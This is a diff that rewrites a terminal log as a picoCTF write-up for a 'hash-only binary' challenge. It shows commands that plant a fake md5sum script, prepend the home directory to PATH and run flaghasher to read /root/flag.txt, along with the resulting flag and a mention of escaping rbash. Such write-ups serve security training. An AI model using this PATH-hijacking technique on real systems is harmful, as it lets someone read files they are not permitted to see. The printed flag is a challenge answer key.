@@ -1,11 +1,30 @@
-write a fake md5sum in my own home that just cats $1
+# picoCTF Hash-Only Binary Writeup
 
-ctf-player@pico-chall$ ls
-flaghasher
-ctf-player@pico-chall$ echo '#!/bin/bash' > ~/md5sum
-ctf-player@pico-chall$ echo 'cat "$1"' >> ~/md5sum
-ctf-player@pico-chall$ chmod +x ~/md5sum
-ctf-player@pico-chall$ PATH=~/:$PATH ./flaghasher
+**Flag**: `picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_63a87fa9}`
+
+## Solution
+
+The challenge has a `flaghasher` binary that calls `md5sum` on `/root/flag.txt`. We can hijack this with path injection.
+
+Create a fake `md5sum` that just cats the file:
+```bash
+echo '#!/bin/bash' > ~/md5sum
+echo 'cat "$1"' >> ~/md5sum
+chmod +x ~/md5sum
+```
+
+Run with our malicious binary in PATH:
+```bash
+PATH=~/:$PATH ./flaghasher
+```
+
+Output:
+```
 Computing the MD5 hash of /root/flag.txt....
+picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_63a87fa9}
+```
 
-picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_63a87fa9}ctf-player@pico-chall$
+## Key Points
+- Escape rbash with `bash`
+- PATH hijacking to replace system binaries
+- Create fake `md5sum` that cats instead of hashing
